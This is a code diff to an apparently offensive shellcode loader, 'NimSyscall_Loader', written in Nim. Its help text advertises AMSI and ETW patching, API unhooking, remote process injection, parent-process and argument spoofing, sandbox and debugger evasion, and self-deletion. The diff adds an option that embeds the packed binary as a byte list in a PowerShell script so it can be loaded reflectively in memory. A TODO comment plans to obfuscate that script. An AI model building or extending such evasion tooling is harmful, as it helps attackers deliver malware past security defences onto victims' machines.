@@ -28,6 +28,7 @@ import PELoad
 import CurrentProcInject
 import RemoteProcInject
 import DInvoke
+import Powershell
 
 
 from system import io
@@ -63,7 +64,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.75
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -90,6 +91,7 @@ Options:
   --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
+  --psout    Powershell Output format, reflectively loading the packed binary
 
 [Payload retrieval options]
 
@@ -198,6 +200,7 @@ var
     dllToClone: string = ""
     dllProxy: bool = false
     noNimMain: bool = false
+    psout: bool = false
     cpl: bool = false
     replaceNimMain: bool = false
     big: bool
@@ -280,6 +283,10 @@ if args["--file"]:
 if args["--key"]:
   let keyname = args["--key"]
   envkey = fmt"{keyname}"
+
+if args["--psout"]:
+    psout = true
+    reflective = true
 
 if args["--arguments"]:
   let argsForPE = args["--arguments"]
@@ -2320,6 +2327,30 @@ proc replaceList () =
         discard exec_cmd_ex(command)
 
 
+# we need a function here, that takes the output file and retrieves a list of all bytes from it separated with a "," and then replaces the egg string QWERQWERQWER in the file Script.ps1 with the list of bytes
+proc WritePS1() =
+    var exists: bool = true
+    try:
+        var fileCheck = readFile(fmt"{outfile}")
+    except:
+        exists = false
+    if(exists):
+        var file = open(fmt"{outfile}", fmRead)
+        var bytes: seq[byte] = toByteSeq(file.readAll())
+        file.close()
+        var length: int = len(bytes) - 1
+        var byteList: string = ""
+        for i in 0..length:
+            byteList.add(fmt"{bytes[i]},")
+        byteList = byteList[0..^2]
+        var script: string = Powershelltemplate
+        script = script.replace("QWERQWERQWER", byteList)
+        writeFile(fmt"{outfile}.ps1", script)
+    else:
+        echo fmt"[!] File {outfile}.ps1 not found, skipping byte list creation"
+
+
+
 if(replace):
     replaceList()
 
@@ -2391,5 +2422,17 @@ if(exists):
 
     if (dllProxy):
         echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
+    if(psout):
+        WritePS1()
+        echo "\r\nPowershell script saved to: " & fmt"{outfile}.ps1"
+        # Todo: Obfuscate the Script by replacing all VAR0001 to VAR0999 variables with random strings as well as FUN001 to FUN999 functions, ERROR01 to ERROR99 error messages and so on
+
+
+
+
+
+
+
+
 else:
     echo "\r\nCompilation failed!! Check the error message.\r\n"
